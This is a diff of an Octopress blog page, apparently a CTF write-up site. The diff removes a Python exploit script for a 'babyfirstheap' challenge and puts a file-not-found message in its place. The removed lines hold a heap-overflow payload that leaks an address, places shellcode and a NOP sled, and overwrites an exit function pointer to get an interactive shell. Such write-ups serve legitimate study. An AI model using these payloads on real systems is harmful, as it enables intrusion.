@@ -9,10 +9,8 @@
   <meta name="author" content="pwn_expoit">
 
   
-  <meta name="description" content="\&lsquo;from pwn_expoit import *
-import time
-a = 0.3
-def MakeCon(): MakeCon = remote(&ldquo;192.168.224.152&rdquo;,4444) return MakeCon s = MakeCon &hellip;">
+  <meta name="description" content="File /home/pwn/Desktop/octopress/source/codeview/source/codeview/babyfirstheap.py could not be found
+">
   
 
   <!-- http://t.co/dKP3o1e -->
@@ -92,30 +90,7 @@ def MakeCon(): MakeCon = remote(&ldquo;192.168.224.152&rdquo;,4444) return MakeC
   </header>
 
 
-  <div class="entry-content"><p>\&lsquo;from pwn_expoit import *
-import time
-a = 0.3
-def MakeCon():
-  MakeCon = remote(&ldquo;192.168.224.152&rdquo;,4444)
-  return MakeCon</p>
-
-<p>s = MakeCon()
-leak = s.recvuntil(&ldquo;[size=260]&rdquo;)[-18:-11]
-hex_addr = int(&ldquo;0x&rdquo;+leak,16)
-print hex_addr
-exit_func = 0x804c8ac
-dat  = &ldquo;&rdquo;
-dat += &ldquo;\xeb\x0c&rdquo;
-dat += nopsled(30)
-dat += shellcode(32)
-dat += &ldquo;A&rdquo;*(260-len(dat))
-dat += &ldquo;\x01\x00\x00\x00&rdquo;
-dat += p32(exit_func-0x8)
-dat += p32(hex_addr)
-time.sleep(a)
-s.send(dat+&ldquo;\n&rdquo;)
-s.interactive()
-\'</p>
+  <div class="entry-content"><p>File /home/pwn/Desktop/octopress/source/codeview/source/codeview/babyfirstheap.py could not be found</p>
 </div>
   
   
